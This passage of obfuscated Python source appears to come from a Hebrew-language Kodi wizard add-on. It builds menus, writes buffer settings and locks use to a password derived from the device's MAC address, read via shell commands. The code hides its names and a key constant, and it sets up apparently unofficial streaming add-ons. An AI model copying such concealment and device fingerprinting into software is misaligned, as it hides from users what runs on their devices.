					OO0000OOO0O0OO000 =OOO00OOO0OO0OOO0O [0 ]#line:1686
					if OO0000OOO0O0OO000 in "'\"":#line:1687
						if OOO00OOO0OO0OOO0O .find ('='+OO0000OOO0O0OO000 ,OOO00OOO0OO0OOO0O .find (OO0000OOO0O0OO000 ,1 ))>-1 :#line:1688
							OOO00OOO0OO0OOO0O =OOO00OOO0OO0OOO0O [:OOO00OOO0OO0OOO0O .find ('='+OO0000OOO0O0OO000 ,OOO00OOO0OO0OOO0O .find (OO0000OOO0O0OO000 ,1 ))]#line:1689
						if OOO00OOO0OO0OOO0O .rfind (OO0000OOO0O0OO000 ,1 )>-1 :#line:1691
							OOO00OOO0OO0OOO0O =OOO00OOO0OO0OOO0O [1 :OOO00OOO0OO0OOO0O .rfind (OO0000OOO0O0OO000 )]#line:1692
					else :#line:1693
						if OOO00OOO0OO0OOO0O .find (" ")>0 :#line:1694
							OOO00OOO0OO0OOO0O =OOO00OOO0OO0OOO0O [:OOO00OOO0OO0OOO0O .find (" ")]#line:1695
						elif OOO00OOO0OO0OOO0O .find ("/")>0 :#line:1696
							OOO00OOO0OO0OOO0O =OOO00OOO0OO0OOO0O [:OOO00OOO0OO0OOO0O .find ("/")]#line:1697
						elif OOO00OOO0OO0OOO0O .find (">")>0 :#line:1698
							OOO00OOO0OO0OOO0O =OOO00OOO0OO0OOO0O [:OOO00OOO0OO0OOO0O .find (">")]#line:1699
					O0OO0OOO00O0O000O .append (OOO00OOO0OO0OOO0O .strip ())#line:1701
			OOOO0OO00OO0OO0O0 =O0OO0OOO00O0O000O #line:1702
		else :#line:1703
			O0OO0OOO00O0O000O =[]#line:1704
			for OO00O0O0O0000000O in OOOO0OO00OO0OO0O0 :#line:1705
				O000OOO00OO0OOOO0 =u"</"+name #line:1706
				O00O000OO00OOOOOO =O000000O000OO0O00 .find (OO00O0O0O0000000O )#line:1708
				O0OO0O000000OOO0O =O000000O000OO0O00 .find (O000OOO00OO0OOOO0 ,O00O000OO00OOOOOO )#line:1709
				OO0O0O0OO0OOO0O00 =O000000O000OO0O00 .find ("<"+name ,O00O000OO00OOOOOO +1 )#line:1710
				while OO0O0O0OO0OOO0O00 <O0OO0O000000OOO0O and OO0O0O0OO0OOO0O00 !=-1 :#line:1712
					O0OOO00OO000OOO0O =O000000O000OO0O00 .find (O000OOO00OO0OOOO0 ,O0OO0O000000OOO0O +len (O000OOO00OO0OOOO0 ))#line:1713
					if O0OOO00OO000OOO0O !=-1 :#line:1714
						O0OO0O000000OOO0O =O0OOO00OO000OOO0O #line:1715
					OO0O0O0OO0OOO0O00 =O000000O000OO0O00 .find ("<"+name ,OO0O0O0OO0OOO0O00 +1 )#line:1716
				if O00O000OO00OOOOOO ==-1 and O0OO0O000000OOO0O ==-1 :#line:1718
					OO00OO00O00000OOO =u""#line:1719
				elif O00O000OO00OOOOOO >-1 and O0OO0O000000OOO0O >-1 :#line:1720
					OO00OO00O00000OOO =O000000O000OO0O00 [O00O000OO00OOOOOO +len (OO00O0O0O0000000O ):O0OO0O000000OOO0O ]#line:1721
				elif O0OO0O000000OOO0O >-1 :#line:1722
					OO00OO00O00000OOO =O000000O000OO0O00 [:O0OO0O000000OOO0O ]#line:1723
				elif O00O000OO00OOOOOO >-1 :#line:1724
					OO00OO00O00000OOO =O000000O000OO0O00 [O00O000OO00OOOOOO +len (OO00O0O0O0000000O ):]#line:1725
				if ret :#line:1727
					O000OOO00OO0OOOO0 =O000000O000OO0O00 [O0OO0O000000OOO0O :O000000O000OO0O00 .find (">",O000000O000OO0O00 .find (O000OOO00OO0OOOO0 ))+1 ]#line:1728
					OO00OO00O00000OOO =OO00O0O0O0000000O +OO00OO00O00000OOO +O000OOO00OO0OOOO0 #line:1729
				O000000O000OO0O00 =O000000O000OO0O00 [O000000O000OO0O00 .find (OO00OO00O00000OOO ,O000000O000OO0O00 .find (OO00O0O0O0000000O ))+len (OO00OO00O00000OOO ):]#line:1731
				O0OO0OOO00O0O000O .append (OO00OO00O00000OOO )#line:1732
			OOOO0OO00OO0OO0O0 =O0OO0OOO00O0O000O #line:1733
		OO00O000OO00OO000 +=OOOO0OO00OO0OO0O0 #line:1734
	return OO00O000OO00OO000 #line:1736
def addItem (O0OOOOO0000O0OOOO ,OO0O00O0000O0OO00 ,O00OOO0000OO0OO00 ,OOOO0OO0OOOOO0000 ,O0O0000OOO00O0OO0 ,description =None ):#line:1738
	if description ==None :description =''#line:1739
	description ='[COLOR white]'+description +'[/COLOR]'#line:1740
	O0OOO0O00O00OO0OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0O00O0000O0OO00 )+"&mode="+str (O00OOO0000OO0OO00 )+"&name="+urllib .quote_plus (O0OOOOO0000O0OOOO )+"&iconimage="+urllib .quote_plus (OOOO0OO0OOOOO0000 )+"&fanart="+urllib .quote_plus (O0O0000OOO00O0OO0 )#line:1741
	OOOOO0OOOO000O0OO =True #line:1742
	OOO0O00O00O000O00 =xbmcgui .ListItem (O0OOOOO0000O0OOOO ,iconImage =OOOO0OO0OOOOO0000 ,thumbnailImage =OOOO0OO0OOOOO0000 )#line:1743
	OOO0O00O00O000O00 .setInfo (type ="Video",infoLabels ={"Title":O0OOOOO0000O0OOOO ,"Plot":description })#line:1744
	OOO0O00O00O000O00 .setProperty ("fanart_Image",O0O0000OOO00O0OO0 )#line:1745
	OOO0O00O00O000O00 .setProperty ("icon_Image",OOOO0OO0OOOOO0000 )#line:1746
	OOOOO0OOOO000O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOO0O00O00OO0OO ,listitem =OOO0O00O00O000O00 ,isFolder =False )#line:1747
	return OOOOO0OOOO000O0OO #line:1748
def get_params ():#line:1750
		O0O0OO00OOOOO00OO =[]#line:1751
		O000O0OO00O00O0O0 =sys .argv [2 ]#line:1752
		if len (O000O0OO00O00O0O0 )>=2 :#line:1753
				OOO00OO00OOOO0OO0 =sys .argv [2 ]#line:1754
				O0OO0OOO00OOO0O00 =OOO00OO00OOOO0OO0 .replace ('?','')#line:1755
				if (OOO00OO00OOOO0OO0 [len (OOO00OO00OOOO0OO0 )-1 ]=='/'):#line:1756
						OOO00OO00OOOO0OO0 =OOO00OO00OOOO0OO0 [0 :len (OOO00OO00OOOO0OO0 )-2 ]#line:1757
				OOO00000O00OO0OOO =O0OO0OOO00OOO0O00 .split ('&')#line:1758
				O0O0OO00OOOOO00OO ={}#line:1759
				for O0OO00OOO00O0OO0O in range (len (OOO00000O00OO0OOO )):#line:1760
						OO0OOO000OOO000O0 ={}#line:1761
						OO0OOO000OOO000O0 =OOO00000O00OO0OOO [O0OO00OOO00O0OO0O ].split ('=')#line:1762
						if (len (OO0OOO000OOO000O0 ))==2 :#line:1763
								O0O0OO00OOOOO00OO [OO0OOO000OOO000O0 [0 ]]=OO0OOO000OOO000O0 [1 ]#line:1764
		return O0O0OO00OOOOO00OO #line:1766
def decode (OO000O00O0000O0O0 ,OO000OOO0000OO000 ):#line:1771
    import base64 #line:1772
    OOO0OOOO00OO0O0O0 =[]#line:1773
    if (len (OO000O00O0000O0O0 ))!=4 :#line:1775
     return 10 #line:1776
    OO000OOO0000OO000 =base64 .urlsafe_b64decode (OO000OOO0000OO000 )#line:1777
    for O00O00OOOOOO00000 in range (len (OO000OOO0000OO000 )):#line:1779
        OO000O00O00O00000 =OO000O00O0000O0O0 [O00O00OOOOOO00000 %len (OO000O00O0000O0O0 )]#line:1780
        O00O0000OO0OO0OOO =chr ((256 +ord (OO000OOO0000OO000 [O00O00OOOOOO00000 ])-ord (OO000O00O00O00000 ))%256 )#line:1781
        OOO0OOOO00OO0O0O0 .append (O00O0000OO0OO0OOO )#line:1782
    return "".join (OOO0OOOO00OO0O0O0 )#line:1783
def tmdb_list (O000OOOOOO0O0OOO0 ):#line:1784
    OO000OOO0O00O0OO0 =decode ("7643",O000OOOOOO0O0OOO0 )#line:1787
    return int (OO000OOO0O00O0OO0 )#line:1790
def u_list (OOOOOOOO0OOOOOOO0 ):#line:1791
    from math import sqrt #line:1793
    OOOOOOOOOOOO0O0O0 =tmdb_list (TMDB_NEW_API )#line:1794
    OOOOO0O00O00OOO00 =str ((getHwAddr ('eth0'))*OOOOOOOOOOOO0O0O0 )#line:1796
    O0OOO00O0000O00OO =int (OOOOO0O00O00OOO00 [1 ]+OOOOO0O00O00OOO00 [2 ]+OOOOO0O00O00OOO00 [5 ]+OOOOO0O00O00OOO00 [7 ])#line:1797
    OO0OO0000000OO00O =(ADDON .getSetting ("pass"))#line:1799
    OO00000000O0OO0O0 =(str (round (sqrt ((O0OOO00O0000O00OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1804
    if '.'in OO00000000O0OO0O0 :#line:1805
     OO00000000O0OO0O0 =(str (round (sqrt ((O0OOO00O0000O00OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1806
    if OO0OO0000000OO00O ==OO00000000O0OO0O0 :#line:1808
      O00O000O0O00OO0O0 =OOOOOOOO0OOOOOOO0 #line:1810
    else :#line:1812
       if STARTP2 ()and STARTP ()=='ok':#line:1813
         return OOOOOOOO0OOOOOOO0 #line:1816
       O00O000O0O00OO0O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1817
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1818
       sys .exit ()#line:1819
    return O00O000O0O00OO0O0 #line:1820
def disply_hwr ():#line:1823
   try :#line:1824
    O0O0OO0OO00OOOO0O =tmdb_list (TMDB_NEW_API )#line:1825
    O0O0O0OOOOO0000OO =str ((getHwAddr ('eth0'))*O0O0OO0OO00OOOO0O )#line:1826
    OOOOO00O00O0OO0O0 =(O0O0O0OOOOO0000OO [1 ]+O0O0O0OOOOO0000OO [2 ]+O0O0O0OOOOO0000OO [5 ]+O0O0O0OOOOO0000OO [7 ])#line:1833
    OOOO00000O0O00O00 =(ADDON .getSetting ("action"))#line:1834
    wiz .setS ('action',str (OOOOO00O00O0OO0O0 ))#line:1836
   except :pass #line:1837
def disply_hwr2 ():#line:1838
   try :#line:1839
    O0OO0000O0O0O00O0 =tmdb_list (TMDB_NEW_API )#line:1840
    O0OOOO0O000OO00O0 =str ((getHwAddr ('eth0'))*O0OO0000O0O0O00O0 )#line:1842
    O000000O0OO00OO0O =(O0OOOO0O000OO00O0 [1 ]+O0OOOO0O000OO00O0 [2 ]+O0OOOO0O000OO00O0 [5 ]+O0OOOO0O000OO00O0 [7 ])#line:1851
    O00O00000O00O0OOO =(ADDON .getSetting ("action"))#line:1852
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O000000O0OO00OO0O )#line:1855
   except :pass #line:1856
def getHwAddr (O00OO00OOOOOOOOO0 ):#line:1858
   import subprocess ,time #line:1859
   O000OOOO0OOO0OO0O ='windows'#line:1860
   if xbmc .getCondVisibility ('system.platform.android'):#line:1861
       O000OOOO0OOO0OO0O ='android'#line:1862
   if xbmc .getCondVisibility ('system.platform.android'):#line:1863
     O00OO0O0O0OO0O00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1864
     O00OOO0O0000O0000 =re .compile ('link/ether (.+?) brd').findall (str (O00OO0O0O0OO0O00O ))#line:1866
     O00OOOOO0OOOO00O0 =0 #line:1867
     for OO000OOO000O00O00 in O00OOO0O0000O0000 :#line:1868
      if O00OOO0O0000O0000 !='00:00:00:00:00:00':#line:1869
          O00OO0000000O0000 =OO000OOO000O00O00 #line:1870
          O00OOOOO0OOOO00O0 =O00OOOOO0OOOO00O0 +int (O00OO0000000O0000 .replace (':',''),16 )#line:1871
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1873
       OO00OOO0OO000OOO0 =0 #line:1874
       O00OOOOO0OOOO00O0 =0 #line:1875
       OOO0OOO000O0O00O0 =[]#line:1876
       OOO0O0OOO0000OO0O =os .popen ("getmac").read ()#line:1877
       OOO0O0OOO0000OO0O =OOO0O0OOO0000OO0O .split ("\n")#line:1878
       for O00O00O0O0O00000O in OOO0O0OOO0000OO0O :#line:1880
            OO0OOOOOOOOOO0000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00O00O0O0O00000O ,re .I )#line:1881
            if OO0OOOOOOOOOO0000 :#line:1882
                O00OOO0O0000O0000 =OO0OOOOOOOOOO0000 .group ().replace ('-',':')#line:1883
                OOO0OOO000O0O00O0 .append (O00OOO0O0000O0000 )#line:1884
                O00OOOOO0OOOO00O0 =O00OOOOO0OOOO00O0 +int (O00OOO0O0000O0000 .replace (':',''),16 )#line:1887
   else :#line:1889
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1890
   try :#line:1907
    return O00OOOOO0OOOO00O0 #line:1908
   except :pass #line:1909
def getpass ():#line:1910
	disply_hwr2 ()#line:1912
def setpass ():#line:1913
    O0OOO0O000O00O0OO =xbmcgui .Dialog ()#line:1914
    O0OO0O00OOOOO000O =''#line:1915
    OO00OO0O000OOO0OO =xbmc .Keyboard (O0OO0O00OOOOO000O ,'הכנס סיסמה')#line:1917
    OO00OO0O000OOO0OO .doModal ()#line:1918
    if OO00OO0O000OOO0OO .isConfirmed ():#line:1919
           OO00OO0O000OOO0OO =OO00OO0O000OOO0OO .getText ()#line:1920
    wiz .setS ('pass',str (OO00OO0O000OOO0OO ))#line:1921
def setuname ():#line:1922
    O0OO0O0OOO0O0O0O0 =''#line:1923
    O0O00O0O0OOOO0000 =xbmc .Keyboard (O0OO0O0OOO0O0O0O0 ,'הכנס שם משתמש')#line:1924
    O0O00O0O0OOOO0000 .doModal ()#line:1925
    if O0O00O0O0OOOO0000 .isConfirmed ():#line:1926
           O0OO0O0OOO0O0O0O0 =O0O00O0O0OOOO0000 .getText ()#line:1927
           wiz .setS ('user',str (O0OO0O0OOO0O0O0O0 ))#line:1928
def powerkodi ():#line:1929
    os ._exit (1 )#line:1930
def buffer1 ():#line:1932
	O00O00O0O00OOOOOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1933
	OO00O0O0000000OO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1934
	O0O0OOOO000O0O00O =xbmc .getInfoLabel ("System.FreeMemory")#line:1935
	O0OO00OO000OOO000 =re .sub ('[^0-9]','',O0O0OOOO000O0O00O )#line:1936
	O0OO00OO000OOO000 =int (O0OO00OO000OOO000 )/3 #line:1937
	OO0O0O0000O0OOO00 =O0OO00OO000OOO000 *1024 *1024 #line:1938
	try :OO0OO0O0OOO0O000O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1939
	except :OO0OO0O0OOO0O000O =16 #line:1940
	OO0000OO00O0OO00O =DIALOG .yesno ('FREE MEMORY: '+str (O0O0OOOO000O0O00O ),'Based on your free Memory your optimal buffersize is: '+str (O0OO00OO000OOO000 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1943
	if OO0000OO00O0OO00O ==1 :#line:1944
		with open (O00O00O0O00OOOOOO ,"w")as OOO0O0O000O00000O :#line:1945
			if OO0OO0O0OOO0O000O >=17 :O0O00OO00000O0000 =xml_data_advSettings_New (str (OO0O0O0000O0OOO00 ))#line:1946
			else :O0O00OO00000O0000 =xml_data_advSettings_old (str (OO0O0O0000O0OOO00 ))#line:1947
			OOO0O0O000O00000O .write (O0O00OO00000O0000 )#line:1949
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0O0000O0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1950
	elif OO0000OO00O0OO00O ==0 :#line:1952
		OO0O0O0000O0OOO00 =_O00OOO00000OOOO00 (default =str (OO0O0O0000O0OOO00 ),heading ="INPUT BUFFER SIZE")#line:1953
		with open (O00O00O0O00OOOOOO ,"w")as OOO0O0O000O00000O :#line:1954
			if OO0OO0O0OOO0O000O >=17 :O0O00OO00000O0000 =xml_data_advSettings_New (str (OO0O0O0000O0OOO00 ))#line:1955
			else :O0O00OO00000O0000 =xml_data_advSettings_old (str (OO0O0O0000O0OOO00 ))#line:1956
			OOO0O0O000O00000O .write (O0O00OO00000O0000 )#line:1957
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0O0000O0OOO00 ),'Please restart Kodi for settings to apply.','')#line:1958
def xml_data_advSettings_old (OO0OO00O0O0OOOOOO ):#line:1959
	OOOO0OOOOOO0O0000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OO00O0O0OOOOOO #line:1969
	return OOOO0OOOOOO0O0000 #line:1970
def xml_data_advSettings_New (OOOO0O00O0OOO0O0O ):#line:1972
	O0OOOO0OOOOO0O00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOOO0O00O0OOO0O0O #line:1984
	return O0OOOO0OOOOO0O00O #line:1985
def write_ADV_SETTINGS_XML (O000O0OO0O0OOO00O ):#line:1986
    if not os .path .exists (xml_file ):#line:1987
        with open (xml_file ,"w")as OO00O00O00000OOOO :#line:1988
            OO00O00O00000OOOO .write (xml_data )#line:1989
def _O00OOO00000OOOO00 (default ="",heading ="",hidden =False ):#line:1990
    ""#line:1991
    OO000O0O00OOOO00O =xbmc .Keyboard (default ,heading ,hidden )#line:1992
    OO000O0O00OOOO00O .doModal ()#line:1993
    if (OO000O0O00OOOO00O .isConfirmed ()):#line:1994
        return unicode (OO000O0O00OOOO00O .getText (),"utf-8")#line:1995
    return default #line:1996
def index ():#line:1998
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1999
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2000
	if AUTOUPDATE =='Yes':#line:2001
		if wiz .workingURL (WIZARDFILE )==True :#line:2002
			OO000O000OO0O0O0O =wiz .checkWizard ('version')#line:2003
			if OO000O000OO0O0O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO000O000OO0O0O0O ),'wizardupdate',themeit =THEME2 )#line:2004
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2005
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2006
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2007
	if len (BUILDNAME )>0 :#line:2008
		O00OO000OOO0000O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2009
		OO0OO0O0OO0O0OO00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2010
		if O00OO000OOO0000O0 >BUILDVERSION :OO0OO0O0OO0O0OO00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0OO0O0OO0O0OO00 ,O00OO000OOO0000O0 )#line:2011
		addDir (OO0OO0O0OO0O0OO00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2013
		try :#line:2015
		     OOOO000O00O0O0OO0 =wiz .themeCount (BUILDNAME )#line:2016
		except :#line:2017
		   OOOO000O00O0O0OO0 =False #line:2018
		if not OOOO000O00O0O0OO0 ==False :#line:2019
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2020
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2021
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2024
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2025
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2026
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2030
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2032
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2034
def morsetup ():#line:2036
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2037
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2038
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2039
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2040
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2041
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2045
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2046
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2049
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	setView ('files','viewType')#line:2061
def morsetup2 ():#line:2062
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2063
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2064
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2065
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2066
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2067
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2069
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2070
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2072
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
def fastupdate ():#line:2074
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2075
def forcefastupdate ():#line:2077
			O00OOO00OOOO00O00 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2078
			wiz .ForceFastUpDate (ADDONTITLE ,O00OOO00OOOO00O00 )#line:2079
def rdsetup ():#line:2083
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2084
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2088
def traktsetup ():#line:2091
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2092
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2093
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2094
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2095
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2096
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2097
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2098
	setView ('files','viewType')#line:2099
def setautorealdebrid ():#line:2100
    from resources .libs import real_debrid #line:2101
    O0OOO0OO00OO0O00O =real_debrid .RealDebridFirst ()#line:2102
    O0OOO0OO00OO0O00O .auth ()#line:2103
def setrealdebrid ():#line:2105
    O0OOOOO000OO0O0O0 =(ADDON .getSetting ("auto_rd"))#line:2106
    if O0OOOOO000OO0O0O0 =='false':#line:2107
       ADDON .openSettings ()#line:2108
    else :#line:2109
        from resources .libs import real_debrid #line:2110
        OO0OO0000O0000O0O =real_debrid .RealDebrid ()#line:2111
        OO0OO0000O0000O0O .auth ()#line:2112
        rdon ()#line:2115
def resolveurlsetup ():#line:2117
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2118
def urlresolversetup ():#line:2119
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2120
def placentasetup ():#line:2122
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2123
def reptiliasetup ():#line:2124
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2125
def flixnetsetup ():#line:2126
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2127
def yodasetup ():#line:2128
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2129
def numberssetup ():#line:2130
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2131
def uranussetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2133
def genesissetup ():#line:2134
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2135
def net_tools (view =None ):#line:2137
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2138
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2139
	setView ('files','viewType')#line:2141
def speedMenu ():#line:2142
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2143
def viewIP ():#line:2144
	OO000000O000OOO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2158
	OO000OO00000OO0O0 =[];O0OO0OO0OO000O000 =0 #line:2159
	for OO00O0OOO0OO00000 in OO000000O000OOO00 :#line:2160
		O000OO0000000O0O0 =wiz .getInfo (OO00O0OOO0OO00000 )#line:2161
		OOO00OO000O0000O0 =0 #line:2162
		while O000OO0000000O0O0 =="Busy"and OOO00OO000O0000O0 <10 :#line:2163
			O000OO0000000O0O0 =wiz .getInfo (OO00O0OOO0OO00000 );OOO00OO000O0000O0 +=1 ;wiz .log ("%s sleep %s"%(OO00O0OOO0OO00000 ,str (OOO00OO000O0000O0 )));xbmc .sleep (1000 )#line:2164
		OO000OO00000OO0O0 .append (O000OO0000000O0O0 )#line:2165
		O0OO0OO0OO000O000 +=1 #line:2166
	OOOO0OOOOOOO00OOO ,OO0OOO0O00OOO00OO ,O000O0OO00O000OO0 =getIP ()#line:2167
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OO00000OO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2168
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOOOOOO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2169
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O00OOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2170
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0OO00O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2171
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OO00000OO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2172
	setView ('files','viewType')#line:2173
def buildMenu ():#line:2175
